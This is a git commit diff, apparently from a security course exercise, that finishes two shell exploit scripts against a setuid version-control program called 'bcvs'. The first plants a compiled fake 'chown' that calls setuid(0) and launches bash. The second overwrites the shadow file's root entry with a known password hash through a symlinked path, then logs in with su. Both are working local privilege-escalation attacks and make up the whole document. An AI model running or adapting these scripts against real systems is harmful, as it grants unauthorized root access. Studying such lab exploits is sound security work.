0b6344684bb2ed57b69d47f88f4204614bc54ef6
matthillial <matthew.hiller2000@gmail.com>
2020-10-24 00:30:37 -0400

    Finished sploits 1 and 2

--- sploit1.sh
+++ sploit1.sh
@@ -13,21 +13,31 @@ mkdir sbinlink
 cd sbinlink
 cat <<EOF > chown.c
 int main(int argc, char* argv[]) {
+    printf("I'm in");
     setuid(0);
     seteuid(0);
     execlp("bash","bash", (char*)0);
 }
 EOF
 gcc -o chown chown.c
+chmod +x chown
 cd ../..
 /usr/bin/expect <<EOF
 spawn ../bcvs co ../dummydir/sbinlink/chown
 expect "Please write a SHORT explanation:\r"
 send -- "no\r"
+sleep 0.5
 EOF
+#../bcvs co ../dummydir/sbinlink/chown
 cd ..
-/usr/bin/expect <<EOF
+#./bcvs co bcvs.c
+cat <<EOF > xpect
+#!/usr/bin/expect
 spawn ./bcvs co bcvs.c
 expect "Please write a SHORT explanation:\r"
 send -- "no\r"
+interact
 EOF
+chmod +x xpect
+./xpect
+#./bcvs co bcvs.c
--- sploit2.sh
+++ sploit2.sh
@@ -12,14 +12,19 @@ cd dummydir
 mkdir etclink
 cd etclink
 cat <<EOF > shadow
-root:$6$KhGmzjFQm4UlzSo1$meh9grUIf5djWRoQe3FXl9z5/yuO8DdMdiSyEDgQttw/BCKwXC/v0K8Vs5Y48KTBhOdCSWzE79TZBcQKz5Tan.:17791::::::
+root:\$6\$KhGmzjFQm4UlzSo1\$meh9grUIf5djWRoQe3FXl9z5/yuO8DdMdiSyEDgQttw/BCKwXC/v0K8Vs5Y48KTBhOdCSWzE79TZBcQKz5Tan.:17791::::::
 EOF
-cd ../..
-/usr/bin/expect <<EOF
+cd /opt/bcvs/dummydir
+cat <<EOF > xpect
+#!/usr/bin/expect
 spawn ../bcvs co ../dummydir/etclink/shadow
 expect "Please write a SHORT explanation:\r"
 send -- "no\r"
+sleep 2
 spawn su root
-expect "Password:\r"
+expect "Password: "
 send -- "security\r"
+interact
 EOF
+chmod +x xpect
+./xpect
